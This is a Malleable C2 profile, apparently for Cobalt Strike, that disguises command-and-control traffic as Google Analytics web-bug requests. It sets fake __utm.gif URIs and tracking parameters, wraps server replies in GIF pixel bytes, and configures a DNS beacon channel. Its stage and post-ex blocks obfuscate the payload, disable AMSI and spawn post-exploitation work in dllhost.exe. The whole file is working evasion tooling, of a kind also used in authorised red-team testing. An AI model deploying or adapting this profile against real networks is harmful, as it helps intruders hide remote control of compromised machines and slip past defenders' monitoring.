# make our C2 look like a Google Web Bug
# https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting
#
# Author: @armitagehacker

set sleeptime "1";
set tasks_max_size "2097152";

dns-beacon {
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}

stage {
        set userwx "false";
        set cleanup "true";
        set obfuscate "true";
        set module_x64 "xpsservices.dll";
}

post-ex {
        set amsi_disable "true";
        set spawnto_x64 "c:\\windows\\sysnative\\dllhost.exe";
        set spawnto_x86 "c:\\windows\\syswow64\\dllhost.exe";
}

http-get {
	set uri "/__utm.gif";
	client {
		parameter "utmac" "UA-2202604-2";
		parameter "utmcn" "1";
		parameter "utmcs" "ISO-8859-1";
		parameter "utmsr" "1280x1024";
		parameter "utmsc" "32-bit";
		parameter "utmul" "en-US";

		metadata {
			netbios;
			prepend "__utma";
			parameter "utmcc";
		}
	}

	server {
		header "Content-Type" "image/gif";

		output {
			# hexdump pixel.gif
			# 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00
			# 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00
			# 0000020 01 00 01 00 00 02 01 44 00 3b 

			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
			prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
			prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";

			print;
		}
	}
}

http-post {
	set uri "/___utm.gif";
	client {
		header "Content-Type" "application/octet-stream";

		id {
			prepend "UA-220";
			append "-2";
			parameter "utmac";
		}

		parameter "utmcn" "1";
		parameter "utmcs" "ISO-8859-1";
		parameter "utmsr" "1280x1024";
		parameter "utmsc" "32-bit";
		parameter "utmul" "en-US";

		output {
			print;
		}
	}

	server {
		header "Content-Type" "image/gif";

		output {
			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
			prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
			prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
			print;
		}
	}
}

# dress up the staging process too
http-stager {
	server {
		header "Content-Type" "image/gif";
	}
}
